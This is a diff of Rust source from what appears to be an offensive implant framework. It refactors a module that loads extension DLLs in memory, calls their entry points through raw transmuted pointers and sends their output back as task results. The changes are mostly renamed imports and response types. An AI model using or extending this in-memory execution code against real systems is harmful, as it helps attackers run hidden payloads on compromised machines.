@@ -1,19 +1,19 @@
 use core::ffi::c_void;
-use std::ptr::{null, null_mut};
-use crate::{check_request, to_error, Module, Result, TaskResult};
+use std::ptr::{null_mut};
+use crate::{check_request, Module, Result, TaskResult};
 use malefic_helper::common::format_cmdline;
-use malefic_helper::protobuf::implantpb::AssemblyResponse;
-use malefic_helper::protobuf::implantpb::spite::Body;
+use malefic_proto::proto::modulepb::BinaryResponse;
+use malefic_proto::proto::implantpb::spite::Body;
 use async_trait::async_trait;
 use malefic_helper::win::kit::pe::{hijack_commandline, load_pe};
-use malefic_helper::win::types::utils::DllMain;
+use malefic_helper::win::types::DllMain;
 use malefic_helper::win::kit::func::get_func_addr;
 use malefic_helper::win::kit::MaleficModule;
 use malefic_trait::module_impl;
 use async_std::channel::{Receiver, Sender};
 use async_std::channel::unbounded as channel;
 use async_std::sync::{Arc, Mutex};
-use winapi::um::winnt::DLL_PROCESS_ATTACH;
+use malefic_helper::to_error;
 
 lazy_static::lazy_static! {
     static ref ARMORY_CHANNEL: Arc<Mutex<(Sender<String>, Receiver<String>)>> = {
@@ -75,7 +75,7 @@ impl Module for ExecuteArmory {
             }
             
             let args = par.unwrap_or_default() + "\x00";
-            let _ = std::mem::transmute::<usize, DllMain>((*armory).entry_point as _)((*armory).new_module as _, DLL_PROCESS_ATTACH, null_mut());
+            let _ = std::mem::transmute::<usize, DllMain>((*armory).entry_point as _)((*armory).new_module as _, 1, null_mut());
             let _ = std::mem::transmute::<usize, ArmoryFunc>(armory_entrypoint as _)(args.as_ptr() as _, args.len(), armory_callback);
             let receiver = ARMORY_CHANNEL.clone();
             let result = async_std::task::block_on(async {
@@ -86,8 +86,9 @@ impl Module for ExecuteArmory {
             });
         }
 
-        Ok(TaskResult::new_with_body(id, Body::AssemblyResponse(AssemblyResponse{
+        Ok(TaskResult::new_with_body(id, Body::BinaryResponse(BinaryResponse{
             status: 0,
+            message: Vec::new(),
             data: ret,
             err: "".to_string(),
         })))
